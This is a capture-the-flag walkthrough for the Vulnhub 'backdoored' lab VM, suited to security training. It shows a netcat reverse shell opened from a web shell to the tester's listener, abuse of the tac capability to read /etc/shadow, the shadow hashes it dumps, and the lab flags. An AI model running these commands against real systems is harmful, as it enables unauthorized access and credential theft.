# Vulnhub > backdoored


**About Release**

* Name: backdoored: 1
* Date release: 10 Aug 2020
* Author: 0xatom
* Series: backdoored

**Download**

* File: backdooredvm.zip (Size: 783 MB)
* Download: https://mega.nz/file/s7YiTSBD#UM-_Ewu20dHon-FUrBWlSuVhHhSs1vFYCsgDGnYJZVg
* Download (Mirror): https://download.vulnhub.com/backdoored/backdooredvm.zip
* Download (Torrent): https://download.vulnhub.com/backdoored/backdooredvm.zip.torrent ([Magnet](magnet:?xt=urn:btih:6655C72F9924E2CD4A590A3C3366F8263CA4DCB0&dn=backdooredvm.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

**Description**

This is an easy box, to pass your time.

It's vmware based, i dont know if it works on VB you can test it if you want.

There are 2 flags under /home/$user/user.txt & /root/root.txt.

No stupid ctfy/guessy stuff, basic enumeration will give you what you want!

Tip: You can't get a root shell, you just have to read the root flag.

Happy pwning! :D


# User flag

## Services enumeration

Running a full Nmap scan reveals that a web server is running on port 1337:

~~~
PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: backdoored VM
~~~

## Web enumeration

Connecting to port 1337 with our browser shows a static page with instructions. There is a fake `robots.txt` file:

~~~
kali@kali:~$ curl -s http://backdoored.box:1337/robots.txt
base64_string_that_contains_ssh_user_and_password
~~~

After spending a life to enumerate, I eventually found a hidden directory (`wedadmin`) using the `raft-large-directories-lowercase.txt` dictionary from [SecLists](https://github.com/danielmiessler/SecLists).

~~~
kali@kali:/data/backdoored_1$ gobuster dir -u http://backdoored.box:1337 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backdoored.box:1337
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 13:56:06 Starting gobuster
===============================================================
/server-status (Status: 403)
[ERROR] 2020/09/28 13:56:08 [!] parse http://backdoored.box:1337/error_log: net/url: invalid control character in URL
/wedadmin (Status: 301)
===============================================================
2020/09/28 13:56:11 Finished
===============================================================
~~~

## The `/wedadmin` directory

Connecting to the `/wedadmin` location reveals a web shell. We can get a reverse shell by starting a listener (`rlwrap nc -nvlp 4444`) and entering the following command in the web shell: `nc -e /bin/bash 172.16.222.128 4444`. 

Now in our reverse shell:

~~~
kali@kali:/data/backdoored_1/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.143] 57812
which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
bob@backdoored:/var/www/html/wedadmin$ id
id
uid=1000(bob) gid=1000(bob) groups=1000(bob),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
~~~

## User flag

Let's get the user flag:

~~~
bob@backdoored:/var/www/html/wedadmin$ cd /home/bob
cd /home/bob
bob@backdoored:/home/bob$ ls -la
ls -la
total 28
drwxr-xr-x 2 bob  bob  4096 Aug  9 19:38 .
drwxr-xr-x 3 root root 4096 Aug  9 18:09 ..
-rw------- 1 bob  bob     5 Aug  9 19:38 .bash_history
-rw-r--r-- 1 bob  bob   220 Aug  9 18:09 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Aug  9 18:09 .bashrc
-rw-r--r-- 1 bob  bob   807 Aug  9 18:09 .profile
-rw-r--r-- 1 root root   33 Aug  9 18:53 user.txt
bob@backdoored:/home/bob$ cat user.txt
cat user.txt
46f7e8413056847a0d4905c5af103f56
bob@backdoored:/home/bob$ 
~~~

# Root flag

## Privilege escalation

Running `linpeas.sh` on the target will reveal following files with capabilities:

~~~
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tac = cap_dac_read_search+ep
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/tac/) reveals we can do something with `tac`:

*"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."*

## Root flag

Indeed, we are able to read arbitrary privileged files:

~~~
bob@backdoored:/tmp$ tac -s 'RANDOM' "/etc/shadow"
tac -s 'RANDOM' "/etc/shadow"
root:$6$yGRtlX4qJBenKwt7$/IAl8FN0Uykm9SDbsEgCtcaTRRTtNyFN3BUYAUm0THr.8k6IiBWDXSQ/OEale85Bmi9qYYB9gxqzBSacZyJ0s.:18483:0:99999:7:::
daemon:*:18483:0:99999:7:::
bin:*:18483:0:99999:7:::
sys:*:18483:0:99999:7:::
sync:*:18483:0:99999:7:::
games:*:18483:0:99999:7:::
man:*:18483:0:99999:7:::
lp:*:18483:0:99999:7:::
mail:*:18483:0:99999:7:::
news:*:18483:0:99999:7:::
uucp:*:18483:0:99999:7:::
proxy:*:18483:0:99999:7:::
www-data:*:18483:0:99999:7:::
backup:*:18483:0:99999:7:::
list:*:18483:0:99999:7:::
irc:*:18483:0:99999:7:::
gnats:*:18483:0:99999:7:::
nobody:*:18483:0:99999:7:::
_apt:*:18483:0:99999:7:::
systemd-timesync:*:18483:0:99999:7:::
systemd-network:*:18483:0:99999:7:::
systemd-resolve:*:18483:0:99999:7:::
messagebus:*:18483:0:99999:7:::
bob:$6$LtBdhh5HxYSVVC.q$2r4OaVG43jjhYliOm6Fu4IQQ2eyWDQP6Is5QdUL7FtUwr8U6YoRCP.j8CM6UnnpupaCgk7G6D.864o6F.rsvI.:18483:0:99999:7:::
systemd-coredump:!!:18483::::::
sshd:*:18483:0:99999:7:::
~~~

Let's read the root flag:

~~~
bob@backdoored:/tmp$ tac -s 'RANDOM' "/root/root.txt"
tac -s 'RANDOM' "/root/root.txt"
395fdad197a5386ea3f8d02143f3fb75
~~~
